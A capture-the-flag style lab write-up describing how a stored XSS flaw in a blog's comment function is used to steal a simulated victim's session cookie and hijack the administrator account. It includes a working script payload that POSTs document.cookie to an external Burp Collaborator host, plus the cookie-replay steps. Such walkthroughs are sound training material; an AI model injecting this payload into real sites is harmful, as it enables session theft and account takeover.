# Lab: Exploiting cross-site scripting to steal cookies

This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 

**Note**

*To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server.*

*Some users will notice that there is an alternative solution to this lab that does not require Burp Collaborator. However, it is far less subtle than exfiltrating the cookie.*

# Step 1 Find XSS in comments function

I enter a XSS payload in the comments:

![image](https://user-images.githubusercontent.com/83407557/210606940-11bb483d-4ea6-405b-bb96-5b5777af5f39.png)

when I view the post I see that the page tries to print, verifying XSS:


![image](https://user-images.githubusercontent.com/83407557/210607103-e8aeff48-4e8e-4aa8-acd1-3d0086cdef32.png)

# Step 2 Create a payload

First I need to get my collaborator URL:

![image](https://user-images.githubusercontent.com/83407557/210607298-8fbd90ae-b7c2-43ac-b684-1605a76ac7d0.png)

`aycd9gomwhfvcmf87n6i172tlkrbf13q.oastify.com`

Then using this URL I contruct a payload that will steal a cookie when the page is viewed:

```html
<script>
fetch('https://aycd9gomwhfvcmf87n6i172tlkrbf13q.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

# Step 3 Use XSS payload in comment:

![image](https://user-images.githubusercontent.com/83407557/210608346-3f4bff15-d99d-466f-a17d-7dd5b4714de2.png)

# Step 4 poll collaborator and find cookie

I see a POST request that contains the victem's cookie in the request body:

![image](https://user-images.githubusercontent.com/83407557/210608872-9c3d1986-9df1-4a0c-889d-e7b79336f3f2.png)

# Step 5 use cookie to hijack the victem's session:

intercepting the my-account page:

![image](https://user-images.githubusercontent.com/83407557/210609647-b42349ba-00e5-4534-bb1a-8a7decb936ed.png)

adding the cookies:

![image](https://user-images.githubusercontent.com/83407557/210610084-502d2dc4-48cd-4792-940d-d23b216c84e8.png)

Which hijacks the administrator's session and solves the lab:

![image](https://user-images.githubusercontent.com/83407557/210610248-96bba0f4-5acf-42c7-8d09-8ed0159cc1ea.png)
